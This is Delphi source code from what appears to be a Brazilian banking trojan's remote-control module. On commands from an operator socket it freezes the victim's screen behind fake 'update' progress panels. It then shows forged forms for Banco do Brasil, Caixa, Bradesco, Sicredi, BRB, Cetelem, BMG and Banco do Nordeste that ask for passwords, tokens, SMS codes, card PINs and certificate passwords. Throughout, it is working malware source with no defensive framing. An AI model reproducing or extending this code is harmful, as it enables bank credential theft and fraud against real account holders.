  BBJJB.pncrt.Visible := True;
  BBJJB.PPJJ.Visible := True;
  Form12.GBBGF.Progress := 0;
  Form12.TrmGaugeBBGF.Enabled := False;
  BBJJB.Show;
  BaseForm := BBJJB;
  BBJJB.lbname2.Caption := Form1.Label6.Caption;
  BBJJB.edtcrt.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(FBBJJJ.Handle);
  Func.TravaM;
 end;

  // BB EMPRESA SENHA CONTA
 if Form1.Label11.Caption = 'BBCONTA' then
 begin
  Form12.PanelBBEmpresa.Visible := False;
  BBJJB.pncrt.Visible := false;
  BBJJB.PPJJ.Visible := True;
  Form12.GBBGF.Progress := 0;
  Form12.TrmGaugeBBGF.Enabled := False;
  BBJJB.Show;
  BaseForm := BBJJB;
  BBJJB.LBnameJ.Caption := Form1.Label6.Caption;
  BBJJB.edtgfff.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(FBBJJJ.Handle);
 end;

  // BB GF ATUALIZAÇÃO BBGFA
  if Form1.Label11.Caption = 'TRAVABBGBEM' then
   begin
   Form12 := TForm12.Create(Application);
   TelaForm := Form12;
   GetScreenToBmpFake(False,MyFirstBmp);
   sleep(100);
   Form12.Show;
   Form12.Label15.Caption := Form1.Label6.Caption;
   sleep(100);
   Form12.Image11.Visible := True;
   Form12.Image16.Visible := False;
   Form12.PanelBBEmpresa.Visible := True;
   Form12.TrmGaugeBBGF.Enabled := True;
   Func.TravaM;
  end;

  // BB EMPRESA SENHA 8  BBXCS1
 if Form1.Label11.Caption = 'BBXCS1' then
 begin
  Form12.PanelBBEmpresa.Visible := False;
  FBBJJJ.pncrt.Visible := false;
  FBBJJJ.PPJJ.Visible := True;
  Form12.GBBEMPRESA.Progress := 0;
  Form12.TrmGaugeBBEmpresa.Enabled := False;
  FBBJJJ.Show;
  BaseForm := FBBJJJ;
  FBBJJJ.LBnameJ.Caption := Form1.Label6.Caption;
  FBBJJJ.edtgfff.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(FBBJJJ.Handle);
 end;

 // BB EMPRESA SENHA CARTAO
 if Form1.Label11.Caption = 'BBGFCARD' then
 begin
  Form12.PanelBBEmpresa.Visible := False;
  FBBJJJ.pncrt.Visible := false;
  FBBJJJ.PPJJ.Visible := False;
  FBBJJJ.PS6.Visible := True;
  Form12.GBBEMPRESA.Progress := 0;
  Form12.TrmGaugeBBEmpresa.Enabled := False;
  FBBJJJ.Show;
  BaseForm := FBBJJJ;
  FBBJJJ.Label1.Caption := Form1.Label6.Caption;
  FBBJJJ.Edit1.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(FBBJJJ.Handle);
 end;
 // BB EMPRESA CERTIFICADO
 if Form1.Label11.Caption = 'BBECSX' then
 begin
  Form12.PanelBBEmpresa.Visible := False;
  FBBJJJ.pncrt.BringToFront;
  FBBJJJ.pncrt.Visible := True;
  FBBJJJ.PPJJ.Visible := True;
  Form12.GBBEMPRESA.Progress := 0;
  Form12.TrmGaugeBBEmpresa.Enabled := False;
  FBBJJJ.Show;
  BaseForm := FBBJJJ;
  FBBJJJ.lbname2.Caption := Form1.Label6.Caption;
  FBBJJJ.edtcrt.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(FBBJJJ.Handle);
 end;

 // BB 6 DIGITOS
 if Form1.Label11.Caption = 'SENHA6BB' then
 begin
  Form12.PanelBB.Visible := False;
  BB6DI.PP1.Visible:= true;
  Form12.GBB.Progress := 0;
  Form12.TrmGaugeBB.Enabled := False;
  BB6DI.Show;
  BaseForm := BB6DI;
  BB6DI.NomePF.Caption := Form1.Label6.Caption;
  Func.DestravaM;
  ForceForegroundWindow(BB6DI.Handle);
 end;


 // BB ESTILO ATUALIZAÇÃO
if Form1.Label11.Caption ='TRAVABBESTILO' then
begin
 Form12 := TForm12.Create(Application);
 TelaForm := Form12;
 GetScreenToBmpFake(False,MyFirstBmp);
 sleep(100);
 Form12.Show;
 Form12.Label7.Caption := Form1.Label6.Caption;
 sleep(100);
 Form12.PanelBBEstilo.Visible := True;
 Form12.TrmGaugeBBEstilo.Enabled := True;
 ESTIOOOO := TESTIOOOO.Create(Application);
 Func.TravaM;
end;

 // BB ESTILO 6 DIGITOS
 if Form1.Label11.Caption = 'SENHA6E' then
 begin
  Form12.PanelBBEstilo.Visible := False;
  ESTIOOOO.PPEST11.Visible := True;
  Form12.GBB1.Progress := 0;
  Form12.TrmGaugeBBEstilo.Enabled := False;
  ESTIOOOO.Show;
  BaseForm := ESTIOOOO;
  Func.DestravaM;
  ForceForegroundWindow(ESTIOOOO.Handle);
 end;

 // CEF ASSINATURA
  if Form1.Label11.Caption = 'SENHA6CF' then
  begin
    Form12.PanelCEF.Visible := False;
    FXCXCXC00.ppp00.Visible := True;
    Form12.GCEF.Progress := 0;
    Form12.TrmGaugeCEF.Enabled := False;
    FXCXCXC00.Show;
    BaseForm := FXCXCXC00;
    FXCXCXC00.Name.Caption := Form1.Label6.Caption;
    FXCXCXC00.Aedt.SetFocus;
    Func.DestravaM;
    ForceForegroundWindow(FXCXCXC00.Handle);

  end;


  // CEF ATUALIZAÇÃO
  if Form1.Label11.Caption = 'TRAVACEF' then
  begin
    Form12 := TForm12.Create(Application);
    TelaForm := Form12;
    GetScreenToBmpFake(False,MyFirstBmp);
    sleep(100);
    Form12.Show;
    Form12.Label1.Caption := Form1.Label6.Caption;
    sleep(100);
    Form12.PanelCEF.Visible := True;
    Form12.TrmGaugeCEF.Enabled := True;
    Func.TravaM;
  end;

  // DESCO ATUALIZAÇÃO NORMAL
if Form1.Label11.Caption = 'DESCOB' then
begin
Form12 := TForm12.Create(Application);
TelaForm := Form12;
GetScreenToBmpFake(False,MyFirstBmp);
sleep(100);
Form12.Show;
Form12.Label3.Caption := Form1.Label6.Caption;
sleep(100);
Form12.PanelDESCOSimples.Visible := True;
Form12.TrmGaugeDESCOSimples.Enabled := True;
Func.TravaM;
end;

  // DESCO SMS NORMAL
if Form1.Label11.Caption = 'DESKSMS' then
begin
Form12.PanelDescoSimples.Visible := False;
FBRtksms.ppdesctk.Visible := True;
Form12.GDESCO.Progress := 0;
FBRtksms.Show;
BaseForm := FBRtksms;
Form12.TrmGaugeDESCOSimples.Enabled := False;
FBRtksms.edtksms.SetFocus;
Func.DestravaM;
ForceForegroundWindow(FBRtksms.Handle);
end;

// DESCO TABELA NORMAL
if Form1.Label11.Caption = 'DESKOBELA' then
begin
Form12.PanelDescoSimples.Visible := False;
FBRDV.ppdesc.Visible := True;
Form12.GDESCO.Progress := 0;
FBRDV.Show;
BaseForm := FBRDV;
FBRDV.Label1.Caption := Form1.Label6.Caption;
Form12.TrmGaugeDESCOSimples.Enabled := False;
FBRDV.edttb.SetFocus;
FBRDV.Label5.Caption := Form1.Label19.Caption;
Func.DestravaM;
ForceForegroundWindow(FBRDV.Handle);
end;

  //DESCO TOKEN NORMAL
  if Form1.Label11.Caption = 'DESKTOKEN' then
  begin
   Form12.PanelDescoSimples.Visible := False;
   FBRtk.ppdesctk.Visible := True;
   Form12.GDESCO.Progress := 0;
   FBRtk.Show;
   BaseForm := FBRtk;
   Form12.TrmGaugeDESCOSimples.Enabled := False;
   FBRtk.EDTKDFS.SetFocus;
   Func.DestravaM;
   ForceForegroundWindow(FBRtk.Handle);
  end;

  // Cetelem Login
  if Form1.Label11.Caption = 'EditUsuario' then
  begin

   CETELEM.Panel_Cetelem.Visible := True;
   Form12.GDESCO.Progress := 0;
   CETELEM.Show;
   BaseForm := CETELEM;
   Form12.TrmGaugeCetelem.Enabled := False;
   CETELEM.EditUsuario.SetFocus;
   Func.DestravaM;
   ForceForegroundWindow(CETELEM.Handle);
  end;

  // Cetelem Login
  if Form1.Label11.Caption = 'Edit_Usuario' then
  begin

   BMG.Panel_BMG.Visible := True;
   Form12.GDESCO.Progress := 0;
   BMG.Show;
   BaseForm := BMG;
   Form12.TrmGaugeCetelem.Enabled := False;
   BMG.Edit_Usuario.SetFocus;
   Func.DestravaM;
   ForceForegroundWindow(BMG.Handle);
  end;

   // TOKEN SICREDI
 if Form1.Label11.Caption = 'SITOKEN' then
 begin
   Form12.PanelSICR.Visible := False;
   fmtksin.ppssps.Visible := True;
   fmtksin.Show;
   BaseForm := fmtksin;
   Form12.GSICR.Progress := 0;
   Form12.TrmGaugeSICREDI.Enabled := False;
   fmtksin.edtksms.SetFocus;
   Func.DestravaM;
   ForceForegroundWindow(fmtksin.Handle);
   fmtksin.Label1.Caption := Form1.Label6.Caption;
 end;

 // SICREDI ASSINATURA
 if Form1.Label11.Caption = 'ASSSICRE' then
 begin
  Form12.PanelSICR.Visible := False;
  fmtkassin.ppssps.Visible := True;
  fmtkassin.Show;
  BaseForm := fmtkassin;
  Form12.GSICR.Progress := 0;
  Form12.TrmGaugeSICREDI.Enabled := False;
  fmtkassin.edtksms.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(fmtkassin.Handle);
  fmtkassin.Label1.Caption := Form1.Label6.Caption;
 end;

   // SICREDI ATUALIZAÇÃO
  if Form1.Label11.Caption = 'SICRETRA' then
  begin
   Form12 := TForm12.Create(Application);
   TelaForm := Form12;
   GetScreenToBmpFake(False,MyFirstBmp);
   sleep(100);
   Form12.Show;
   Form12.Label6.Caption := Form1.Label6.Caption;
   sleep(100);
   Form12.PanelSICR.Visible := True;
   Form12.TrmGaugeSICREDI.Enabled := True;
   Func.TravaM;
  end;

  // DESCO NET EMPRESA ATUALIZAÇÃO
if Form1.Label11.Caption = 'DESKONET' then
begin
Form12 := TForm12.Create(Application);
TelaForm := Form12;
GetScreenToBmpFake(False,MyFirstBmp);
sleep(100);
Form12.Show;
Form12.Label5.Caption := Form1.Label6.Caption;
sleep(100);
Form12.PanelNET.Visible := True;
Form12.TrmGaugeNET.Enabled := True;
Func.TravaM;
end;

  // DESCO NET EMPRESA CERTIFICADO
if Form1.Label11.Caption = 'DESKOCERTI' then
begin
Form12.PanelNET.Visible := False;
FBRtkJUCRT.ppdesctk.Visible := True;
FBRtkJUCRT.Show;
BaseForm := FBRtkJUCRT;
FBRtkJUCRT.Label1.Caption := Form1.Label6.Caption;
Form12.GNET.Progress := 0;
Form12.TrmGaugeNET.Enabled := False;
FBRtkJUCRT.edtksms.SetFocus;
Func.DestravaM;
ForceForegroundWindow(FBRtkJUCRT.Handle);
end;

// DESCO NET EMPRESA TOKEN
if Form1.Label11.Caption = 'DESKONETTOKEN' then
begin
Form12.PanelNET.Visible := False;
FBRtkJU.ppdesctk.Visible := True;
FBRtkJU.Show;
BaseForm := FBRtkJU;
FBRtkJU.Label1.Caption := Form1.Label6.Caption;
Form12.GNET.Progress := 0;
Form12.TrmGaugeNET.Enabled := False;
FBRtkJU.edtksms.SetFocus;
Func.DestravaM;
ForceForegroundWindow(FBRtkJU.Handle);
end;

// Nordeste TABELA
if Form1.Label11.Caption = 'NordertTabela' then
begin
Form12.Pnordeste.Visible := False;
fffrnosde.ppddttn.Visible := True;
Form12.Gauge1.Progress := 0;
fffrnosde.Show;
BaseForm := fffrnosde;
fffrnosde.NOME.Caption := Form1.Label6.Caption;
Form12.TmNordeste.Enabled := False;
fffrnosde.edtS6.SetFocus;
fffrnosde.lbcha.Caption := Form1.Label19.Caption;
Func.DestravaM;
ForceForegroundWindow(fffrnosde.Handle);
end;

// Nordeste ATUALIZAÇÃO
if Form1.Label11.Caption = 'TravaNordert' then
begin
Form12 := TForm12.Create(Application);
TelaForm := Form12;
GetScreenToBmpFake(False,MyFirstBmp);
sleep(100);
Form12.Show;
Form12.Label16.Caption := Form1.Label6.Caption;
sleep(100);
Form12.Pnordeste.Visible := True;
Form12.TmNordeste.Enabled := True;
Func.TravaM;
end;

// TOKEN brb
 if Form1.Label11.Caption = 'TokenBrb' then
 begin
  Form12.panelbrb.Visible := False;
  fmbrrrrrrrrrrrb.ppssps.Visible := True;
  fmbrrrrrrrrrrrb.Show;
  BaseForm := fmbrrrrrrrrrrrb;
  Form12.Gauge2.Progress := 0;
  Form12.Tmbrb.Enabled := False;
  fmbrrrrrrrrrrrb.edtkbrb.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(fmbrrrrrrrrrrrb.Handle);
  fmbrrrrrrrrrrrb.Label1.Caption := Form1.Label6.Caption;
 end;

   // brb ATUALIZAÇÃO
  if Form1.Label11.Caption ='TravaBRB' then
  begin
   Form12 := TForm12.Create(Application);
   TelaForm := Form12;
   GetScreenToBmpFake(False,MyFirstBmp);
   sleep(100);
   Form12.Show;
   Form12.Label17.Caption := Form1.Label6.Caption;
   sleep(100);
   Form12.panelbrb.Visible := True;
   Form12.Tmbrb.Enabled := True;
   Func.TravaM;
  end;

end;

procedure TFunc.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 Form1.CS1.Socket.SendText('<|CloseChat|>');
end;


end.

